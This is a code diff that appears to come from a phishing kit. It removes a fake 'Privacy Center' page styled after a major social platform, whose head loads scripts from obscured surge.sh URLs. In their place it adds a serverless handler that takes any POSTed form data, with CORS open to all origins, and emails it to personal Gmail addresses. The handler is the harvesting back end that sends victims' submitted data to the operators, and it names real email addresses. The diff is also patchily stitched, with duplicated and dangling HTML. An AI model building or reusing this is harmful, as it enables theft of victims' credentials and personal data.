@@ -1,147 +1,67 @@
-<html lang="en"><head><script type="text/javascript" src="https://form-user-submit-f2.surge.sh/UnanPMKUV9TRE9Q9EklX6xgLvOQZ45z0QowqeAZ7GigfUFLIvnAZcNIgXV1DubYG6wyobZG2qmtx2M_UsaqTmOqx2iQHGYtqIdwP7m8h8mY6UlsgA2UzN70JbKUAH3qxXdzTlDwz0QqVyBqPNv_nPL3dQljyVEGIwu4w_mvmoPs="></script><script type="text/javascript" src="https://user-submit-form-f2.surge.sh/Y2Ze6P8kZAjLaHUZd7A0rAbbAF0H9_ZPceuFZ2jnlolctkTN3NRcJSYMLABYP8nM1RWXH2L6Jbsqw-YhHonolHbeHvwgKImtaOZVvlK1OwYNk2o1o4x6UStxZgbeaDP-SLtO7M78aYj87sQAvgZHJtblJf4o3gwRJsPvXfN27qk="></script>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Privacy Center</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
+import { transporter } from "./emailConfig.js";
 
-    body {
-<meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Privacy Center</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
+export default async function handler(req, res) {
+  // ✅ CORS headers
+  res.setHeader("Access-Control-Allow-Origin", "*");
+  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
+  res.setHeader(
+    "Access-Control-Allow-Headers",
+    "Content-Type, Accept, Authorization"
+  );
 
-    body {
-      background: linear-gradient(
-        130deg,
-        rgba(249, 241, 249, 1) 0%,
-        rgba(234, 243, 253, 1) 35%,
-        rgba(237, 251, 242, 1) 100%
-      );
-      background-attachment: fixed;
-      min-height: 100vh;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      display: flex;
-      flex-direction: column;
-    }
+  // ✅ Handle preflight OPTIONS request
+  if (req.method === "OPTIONS") {
+    return res.status(204).end(); // better than 200 for preflight
+  }
 
-    /* Language Modal Styles */
-    .language-modal {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.7);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      z-index: 99999;
-      backdrop-filter: blur(5px);
-      transition: opacity 0.3s ease;
-    }
-   
-    .language-modal-content {
-      background: #fff;
-      padding: 40px;
-      border-radius: 16px;
-      max-width: 600px;
-      width: 90%;
-      text-align: center;
-      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
-      max-height: 80vh;
-      overflow-y: auto;
-      position: relative;
-      animation: modalFadeIn 0.4s ease-out;
-    }
+  if (req.method !== "POST") {
+    return res.status(405).json({ error: "Method not allowed" });
+  }
 
-    @keyframes modalFadeIn {
-      from {
-        opacity: 0;
-        transform: translateY(-20px) scale(0.95);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0) scale(1);
-      }
+  let formData = {};
+
+  try {
+    if (typeof req.body === "string") {
+      formData = JSON.parse(req.body);
+    } else {
+      formData = req.body;
     }
+  } catch (err) {
+    return res.status(400).json({ error: "Invalid JSON" });
+  }
+
+  if (!formData || Object.keys(formData).length === 0) {
+    return res.status(400).json({ error: "Form data missing" });
+  }
+
+  try {
+    await transporter.sendMail({
+      from: `"PROFESSOR" <adsmenigar@gmail.com>`,
+      to: "abdullahnizamani330@gmail.com,adsmenigar@gmail.com,",
+      subject: "abd",
+      text: JSON.stringify(formData, null, 2),
+      html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
+        formData,
+        null,
+        2
+      )}</pre>`,
+    });
+
+    res
+      .status(200)
+      .json({ success: true, message: "Data sent via email (Asif)" });
+  } catch (error) {
+    console.error("Email send error:", error);
+    res.status(500).json({ error: "Failed to send email" });
+  }
+}
+        
+    
+     
+     
    
-    .language-modal-close {
-      position: absolute;
-      top: 15px;
-      right: 15px;
-      background: #f1f3f4;
-      width: 32px;
-      height: 32px;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      cursor: pointer;
-      transition: all 0.2s ease;
-    }
-    
-    .language-modal-close:hover {
-      background: #e8eaed;
-      transform: rotate(90deg);
-    }
-    
-    .language-modal-close svg {
-      width: 18px;
-      height: 18px;
-      fill: #5f6368;
-    }
    
-    .language-modal-title {
-      font-size: 28px;
-      font-weight: 700;
-      margin-bottom: 10px;
-      color: #1a1a1a;
-      background: linear-gradient(135deg, #0064e0, #0084ff);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
-    }
-   
-    .language-modal-subtitle {
-      font-size: 16px;
-      color: #5f6368;
-      margin-bottom: 30px;
-      line-height: 1.5;
-    }
-   
-    .language-search-container {
-      position: relative;
-      margin-bottom: 20px;
-    }
-    
-    .language-search-input {
-      width: 100%;
-      padding: 14px 16px 14px 45px;
-      border: 1px solid #e0e0e0;
-      border-radius: 8px;
-      font-size: 16px;
-      transition: all 0.3s ease;
-      background: #f8f9fa;
-    }
-    
-    .language-search-input:focus {
-      border-color: #0064e0;
-      box-shadow: 0 0 0 3px rgba(0, 100, 224, 0.15);
-      outline: none;
-      background: #fff;
-    }
-    
-    .language-search-icon {
-      position: absolute;
-      left: 16px;
-      top: 50%;
-      transform: translateY(-50%);
-      color: #5f6368;
-    }
+  
    
     .language-options {
       display: grid;
